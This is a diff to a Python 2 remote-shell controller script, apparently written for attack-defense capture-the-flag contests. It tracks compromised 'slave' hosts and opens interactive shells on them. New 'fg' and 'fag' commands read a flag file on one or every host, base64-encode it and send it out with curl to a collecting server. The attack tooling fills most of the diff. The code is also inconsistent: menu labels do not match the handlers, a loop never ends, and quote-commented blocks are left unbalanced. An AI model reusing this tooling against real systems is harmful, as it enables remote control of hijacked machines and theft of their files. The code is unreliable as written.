@@ -19,6 +19,38 @@ MAX_CONNECTION_NUMBER = 0x10
 def md5(data):
     return hashlib.md5(data).hexdigest()
 
+'''
+def transfer(i, o, is_socket):
+    buffer_size = 0x100
+    while True:
+        if is_socket:
+            buffer = raw_input("$ ") or ("")
+        else:
+            buffer = o.recv(buffer_size)
+        if len(buffer) == 0:
+            print "[-] No data, Breaking..."
+        if is_socket:
+            i.send(buffer)
+        else:
+            print "[+] BUffer : %s" % (buffer)
+    if is_socket:
+        i.shutdown(socket.SHUT_RDWR)
+        i.close()
+        # TODO : remove from slaves
+
+'''
+
+def transfer(socket_fd):
+    buffer_size = 0x400
+    while True:
+        buffer = socket_fd.recv(buffer_size)
+        if not buffer:
+            print "[+] No data, breaking..."
+        sys.stdout.write(buffer)
+        print ""
+    socket_fd.shutdown(socket.SHUT_RDWR)
+    socket_fd.close()
+
 class Slave():
     def __init__(self, socket_fd):
         self.socket_fd = socket_fd
@@ -37,7 +69,9 @@ class Slave():
         print "[+] Port : %s" % (self.port)
         # print "[+] Banner : %s" % (self.banner)
 
+    '''
     def shell_exec(self, shell_command):
+        print "[+] Command : %s" % (shell_command)
         try:
             self.socket_fd.send(shell_command)
         except:
@@ -45,10 +79,41 @@ class Slave():
         time.sleep(0.5)
         result = recvall(self.socket_fd)
         return result
+    '''
+
+    def send_command(self, command):
+        try:
+            self.socket_fd.send(command + "\n")
+            return True
+        except:
+            return False
+
+
+    def interactive_shell(self):
+        t = threading.Thread(target=transfer, args=(self.socket_fd, ))
+        t.start()
+        while True:
+            command = raw_input() or ("exit")
+            if command == "exit":
+                break
+            self.socket_fd.send(command + "\n")
 
     def remove_node(self):
         print "[+] Removing Node!"
         slaves.pop(self.node_hash)
+
+    '''
+    def get_flag_file(self, flag_path):
+        # result = self.shell_exec("python -c 'with open(\"%s\") as f:print \">%%s<\" %% f.read().encode('hex').encode('base64');'" % (flag_path))
+        command = "cat %s" % (flag_path)
+        self.socket_fd.send(command)
+        with open("flag.log", "a+") as f:
+            f.write("-" * 0x10 + "\n")
+            f.write("IP : %s\n" % (self.hostname))
+            f.write("PORT : %s\n" % (self.port))
+            f.write("Flag : %r\n" % (result))
+        return result
+        '''
 
 def master(host, port):
     print "[+] Master starting at %s:%d" % (host, port)
@@ -71,6 +136,8 @@ def show_commands():
     print "        2. [g] : goto a slave"
     print "        3. [c] : interact an shell"
     print "        3. [f] : port forwarding"
+    print "        3. [gf] : get flag"
+    print "        3. [gaf] : get all flag"
     print "        3. [q|quit|exit] : interact an shell"
 
 def node_hash(host, port):
@@ -121,17 +188,48 @@ def main():
             if not found:
                 print "[-] Please check your input node hash!"
                 print "[-] Position is not changed!"
+        elif command == "fag":
+            flag_path = raw_input("Input flag path (/flag.txt) : ") or ("/flag.txt")
+            box_host = raw_input("Input flag box host (192.168.187.128) : ") or ("192.168.187.128")
+            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
+            for i in slaves.keys():
+                slave = slaves[i]
+                command = "FLAG=`cat %s | base64`" % (flag_path)
+                print "[+] Command : %s" % (command)
+                result = slave.send_command(command)
+                command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (box_host, box_port)
+                print "[+] Command : %s" % (command)
+                result = slave.send_command(command)
+                if result:
+                    print "[+] Flag is sent to you!"
+                else:
+                    slave.remove_node()
+                    print "[-] Executing command failed! Connection aborted! Node removed!"
+                    position = slaves.keys()[0]
+                    print "[+] Position changed to : %s" % (position)
+        elif command == "fg":
+            slave = slaves[position]
+            flag_path = raw_input("Input flag path (/flag.txt) : ") or ("/flag.txt")
+            box_host = raw_input("Input flag box host (192.168.187.128) : ") or ("192.168.187.128")
+            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
+            command = "FLAG=`cat %s | base64`" % (flag_path)
+            print "[+] Command : %s" % (command)
+            result = slave.send_command(command)
+            command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (box_host, box_port)
+            print "[+] Command : %s" % (command)
+            result = slave.send_command(command)
+            if result:
+                print "[+] Flag is sent to you!"
+            else:
+                slave.remove_node()
+                print "[-] Executing command failed! Connection aborted! Node removed!"
+                position = slaves.keys()[0]
+                print "[+] Position changed to : %s" % (position)
+
         elif command == "i":
             slave = slaves[position]
-            while True:
-                shell_command = raw_input("$ ") or ""
-                if shell_command == "exit":
-                    break
-                if shell_command == "":
-                    continue
-                result = slave.shell_exec(shell_command + "\n")
-                if result:
-                    print result
+            slave.interactive_shell()
+            '''
         elif command == "c":
             slave = slaves[position]
             shell_command = raw_input("$ ") or ""
@@ -149,7 +247,7 @@ def main():
                     print "[-] Executing command failed! Connection aborted! Node removed!"
                     position = slaves.keys()[0]
                     print "[+] Position changed to : %s" % (position)
-
+                    '''
         elif command == "q" or command == "quit" or command == "exit":
             # TODO : release all resources before closing
             print "[+] Releasing resources..."
